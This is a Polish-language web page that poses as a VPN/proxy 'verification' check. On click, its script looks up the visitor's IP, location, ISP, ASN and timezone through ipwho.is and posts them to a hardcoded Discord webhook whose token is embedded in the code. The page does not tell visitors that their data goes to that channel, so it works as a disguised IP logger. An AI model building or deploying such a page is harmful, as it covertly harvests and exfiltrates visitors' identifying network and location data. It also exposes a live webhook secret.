<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Weryfikacja</title>
<style>
  :root {
    --bg: #0f1115;
    --card: #171a21;
    --border: #262b36;
    --text: #e6e8eb;
    --muted: #8b93a1;
    --accent: #4f6bed;
    --accent-hover: #5f79f0;
    --ok: #3ba55d;
    --err: #ed4245;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
  }

  .card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 32px;
    width: 100%;
    max-width: 400px;
  }

  h1 {
    font-size: 18px;
    font-weight: 600;
    margin-bottom: 8px;
  }

  .desc {
    font-size: 14px;
    color: var(--muted);
    line-height: 1.5;
    margin-bottom: 24px;
  }

  button {
    width: 100%;
    padding: 11px 16px;
    font-size: 14px;
    font-weight: 500;
    font-family: inherit;
    color: #fff;
    background: var(--accent);
    border: none;
    border-radius: 6px;
    cursor: pointer;
    transition: background 0.15s;
  }

  button:hover:not(:disabled) { background: var(--accent-hover); }
  button:disabled { opacity: 0.5; cursor: default; }

  .msg {
    margin-top: 16px;
    font-size: 13px;
    line-height: 1.5;
    display: none;
  }
  .msg.show { display: block; }
  .msg.ok   { color: var(--ok); }
  .msg.err  { color: var(--err); }
  .msg.info { color: var(--muted); }

  .meta {
    margin-top: 24px;
    padding-top: 16px;
    border-top: 1px solid var(--border);
    font-size: 12px;
    color: var(--muted);
  }
</style>
</head>
<body>
  <div class="card">
    <h1>Weryfikacja</h1>
    <p class="desc">
      Kliknij przycisk, aby potwierdzić że nie używasz VPN-a ani proxy.
      Twoje połączenie zostanie sprawdzone automatycznie.
    </p>

    <button id="verifyBtn">Zweryfikuj się</button>
    <div id="msg" class="msg"></div>

    <div class="meta">
      Sprawdzamy adres IP, dostawcę internetu i informacje o połączeniu.
    </div>
  </div>

<script>
(function () {
  'use strict';

  // Podmień na własny URL. Nie publikuj go publicznie — każdy może go wtedy użyć.
  var WEBHOOK = "https://discord.com/api/webhooks/1554845854282547220/jn-VjSi3NGVRwC8hTx1UbkfYwzwJMLXv8mEVj6MwesTRIGTxnSPu-GhATuXBdMtNDbPC";

  var btn = document.getElementById('verifyBtn');
  var msg = document.getElementById('msg');

  function show(text, type) {
    msg.textContent = text;
    msg.className = 'msg show ' + type;
  }

  function isSuspicious(security) {
    if (!security) return false;
    return !!(security.proxy || security.vpn || security.tor || security.hosting);
  }

  function buildPayload(ip, suspicious) {
    var connection = ip.connection || {};
    var timezone = ip.timezone || {};
    var location = [ip.city, ip.region, ip.country].filter(Boolean).join(', ') || 'nieznana';

    var fields = [
      { name: 'IP', value: ip.ip || 'brak', inline: true },
      { name: 'Lokalizacja', value: location, inline: true },
      { name: 'Dostawca', value: connection.isp || 'nieznany', inline: false },
      { name: 'ASN', value: connection.asn ? ('AS' + connection.asn) : 'brak', inline: true },
      { name: 'Strefa czasowa', value: timezone.id || 'brak', inline: true }
    ];

    if (suspicious) {
      var flags = [];
      if (ip.security.proxy)   flags.push('proxy');
      if (ip.security.vpn)     flags.push('vpn');
      if (ip.security.tor)     flags.push('tor');
      if (ip.security.hosting) flags.push('hosting');
      fields.push({ name: 'Wykryto', value: flags.join(', '), inline: false });
    }

    return {
      username: 'Weryfikacja',
      embeds: [{
        title: suspicious ? 'Podejrzane połączenie' : 'Nowa weryfikacja',
        color: suspicious ? 0xed4245 : 0x3ba55d,
        fields: fields,
        timestamp: new Date().toISOString()
      }]
    };
  }

  btn.addEventListener('click', async function () {
    btn.disabled = true;
    show('Sprawdzanie połączenia...', 'info');

    try {
      var res = await fetch('https://ipwho.is/');
      if (!res.ok) throw new Error('serwer zwrócił ' + res.status);

      var ip = await res.json();
      if (!ip.ip) throw new Error('nie udało się ustalić adresu IP');

      var suspicious = isSuspicious(ip.security);
      var payload = buildPayload(ip, suspicious);

      var hook = await fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!hook.ok) {
        var body = await hook.text().catch(function () { return ''; });
        throw new Error('webhook ' + hook.status + (body ? ' — ' + body.slice(0, 120) : ''));
      }

      if (suspicious) {
        show('Wykryto VPN lub proxy. Dostęp zablokowany.', 'err');
      } else {
        show('Weryfikacja zakończona. Możesz kontynuować.', 'ok');
      }
    } catch (e) {
      show('Błąd: ' + e.message, 'err');
      btn.disabled = false;
    }
  });
})();
</script>
</body>
</html>
